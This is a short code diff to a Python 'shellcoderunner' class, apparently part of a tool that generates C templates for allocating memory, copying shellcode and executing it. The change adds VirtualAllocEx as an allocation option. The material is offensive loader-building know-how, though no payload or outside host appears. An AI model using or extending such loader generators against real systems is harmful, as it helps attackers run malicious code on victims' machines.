@@ -10,10 +10,10 @@ class shellcoderunner:
 
         self.allocation = 'VirtualAlloc'
         if 'allocation' in arguments:
-            if arguments['allocation'] in ['VirtualAlloc', 'HeapAlloc', 'NtAllocateVirtualMemory']:
+            if arguments['allocation'] in ['VirtualAlloc', 'HeapAlloc', 'VirtualAllocEx', 'NtAllocateVirtualMemory']:
                 self.allocation = arguments['allocation']
             else:
-                print('Allocation argument must be VirtualAlloc, HeapAlloc, or NtAllocateVirtualMemory')
+                print('Allocation argument must be VirtualAlloc, VirtualAllocEx, HeapAlloc, or NtAllocateVirtualMemory')
                 exit(0)
 
         self.execution = 'CreateThread'
@@ -79,6 +79,8 @@ class shellcoderunner:
             template += HeapAlloc('buffer', 'HEAP_ZERO_MEMORY', '{shellcodeSize}')
         elif self.allocation == 'NtAllocateVirtualMemory':
             template += NtAllocateVirtualMemory('buffer', '(HANDLE)-1', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')
+        elif self.allocation == 'VirtualAllocEx':
+            template += VirtualAllocEx('buffer', '(HANDLE)-1', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')
 
         if self.copy == 'memcpy':
             template += memcpy('buffer', 'shellcode', '{shellcodeSize}')
